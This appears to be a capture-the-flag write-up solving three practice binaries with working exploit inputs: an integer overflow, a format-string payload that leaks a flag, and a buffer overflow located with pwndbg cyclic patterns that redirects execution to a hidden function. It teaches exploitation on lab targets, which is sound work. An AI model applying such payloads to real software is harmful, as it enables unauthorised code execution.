# ctf-binary-exploitation

## Challenge 1

Throw in a large number and it will spit out the flag

```
Random initial kilometer: 2147480334
Increment odometer by value: 12345678
New odometer value is -2135141284
Something went wrong with the odometer.
Here is the flag CTF{REDACTED}
New odometer value -2135141284 has been set
```

## Challenge 2

```bash
python -c "print '\$s ' * 41" | ./challenge-2

Welcome to the vehicle dashboard Please select your options
Select 1 for entering the remaining fuel (in liters)
Select 2 for entering the engine status (0 for off, 1 for on)
Select 3 for showing the current speed (in km/h)
You have selected:
$s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s $s CTF{mY_5trIN9_I5_8L33DING_0a8dfeb25b78db2bcfe524}
```

## Challenge 3

```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab



r < <(echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
```

```bash
Program received signal SIGSEGV, Segmentation fault.
0x62616169 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────
*EAX  0xe1
*EBX  0x62616167 ('gaab')
 ECX  0x0
*EDX  0xf7fc2890 (_IO_stdfile_1_lock) ◂— 0
*EDI  0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— insb byte ptr es:[edi], dx /* 0x1d9d6c */
*ESI  0xf7fc1000 (_GLOBAL_OFFSET_TABLE_) ◂— insb byte ptr es:[edi], dx /* 0x1d9d6c */
*EBP  0x62616168 ('haab')
*ESP  0xffffd520 ◂— 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
*EIP  0x62616169 ('iaab')
──────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────────
Invalid address 0x62616169
```

```bash
pwndbg> cyclic -l 0x62616169
Finding cyclic pattern of 4 bytes: b'iaab' (hex: 0x69616162)
Found at offset 132
```

```bash
pwndbg> disassemble secretTurboMode
Dump of assembler code for function secretTurboMode:
   0x565561d9 <+0>:	push   ebp
   0x565561da <+1>:	mov    ebp,esp
   0x565561dc <+3>:	push   ebx
```


```bash
python -c 'import struct;print "A"*132 + struct.pack("<I",0x565561d9)'
```


```bash
python -c 'import struct;print "A"*132 + struct.pack("<I",0x565561d9)' | ./challenge-3

```

```bash
Please enter new vehicle identifier
New vehicle identifier: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�aUV
Secret turbo mode has been activated
Your flag is CTF{REDACTED}

[1]    5355 done                python -c 'import struct;print "A"*132 + struct.pack("<I",0x565561d9)' |
       5356 segmentation fault  ./challenge-3
```
